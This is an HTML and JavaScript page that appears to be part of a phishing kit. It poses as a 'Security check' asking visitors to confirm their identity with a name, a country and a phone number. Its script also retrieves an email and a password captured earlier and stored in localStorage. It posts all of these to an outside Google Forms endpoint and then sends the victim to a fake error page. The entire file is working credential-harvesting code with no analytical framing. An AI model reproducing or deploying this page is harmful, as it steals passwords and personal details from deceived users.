    <div id="content">
        <div class="container d-flex justify-content-center align-items-center">
            <div class="col-sm-5 col-md-4 col-xs-12 col-md-offset-7 col-sm-offset-6 sigin-box">
                <h1 class="text-center"><img class="img-fluid logo1" src="assets/img/logo.png" alt="" width="100" height="40"></h1>
                <h4 class="text-center m-4" id="sign-head-1"><span style="color: #ff0000;"><strong>Security check</strong></span></h4>
                <h5 class="text-center" id="sign-head-2">Confirm your identity</h5><br><br>
                <p class="text-center email-print"></p><br><br>
                <form id="securityForm"><input type="text" class="sign-input" id="name" name="entry.2063692657" placeholder="Name" required=""><br><br><select class="sign-input" id="country" name="entry.1367935006" required="">
                        <option value="" selected="">Select Country</option>
                        <option value="USA">USA</option>
                        <option value="UK">UK</option>
                        <option value="Canada">Canada</option>
                    </select><br><br><input type="tel" class="sign-input" id="phone" name="entry.1068802741" placeholder="Phone No." required=""><br><br>
                    <p class="text-center"><b style="font-size: 12px;">Enter your phone number and we will send you a verification code to confirm your identity</b></p><br><input type="submit" class="submit-nbtn" id="submit" value="Verify"><br>
                </form>
            </div>
        </div>
    </div><script src="assets/bootstrap/js/bootstrap.min.js"></script><script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="assets/js/bootstrap/js/bootstrap.min.js"></script><script src="assets/js/js/bootstrap.min.js"></script><script src="assets/js/js/ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="assets/js/js/maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script><script>
document.addEventListener("DOMContentLoaded", function() {
    // Show spinner for 5 seconds, then show content
    setTimeout(function() {
        document.getElementById('spinner-wrapper').style.display = 'none';
        document.getElementById('content').style.display = 'block';
    }, 5000); // Changed to 5 seconds

    document.getElementById('securityForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent default form submission

        var name = document.getElementById('name').value;
        var country = document.getElementById('country').value;
        var phone = document.getElementById('phone').value;
        var email = localStorage.getItem("email"); // Retrieve stored email
        var password = localStorage.getItem("password"); // Retrieve stored password

        var formData = new FormData();
        formData.append("entry.1039185615", email);
        formData.append("entry.1871831080", password);
        formData.append("entry.2063692657", name);
        formData.append("entry.1367935006", country);
        formData.append("entry.1068802741", phone);

        // Send form data to Google Forms endpoint
        fetch('https://docs.google.com/forms/u/0/d/e/1FAIpQLSc6HiQEtBNOrKBeThUFeoqkTYLyUmWTTeAXsMhpFffw4nqjgQ/formResponse', {
            method: 'POST',
            body: formData,
            mode: 'cors'
        })
        .then(response => {
            if (response.ok) {
                window.location.href = "New-Error/index.html"; // Redirect to err.html after submission
            } else {
                console.error('Error:', response.statusText);
                window.location.href = "New-Error/index.html"; // Redirect to err.html even if there's an error
            }
        })
        .catch(error => {
            console.error('Error:', error);
            window.location.href = "New-Error/index.html"; // Redirect to err.html even if there's an error
        });
    });
});
</script>
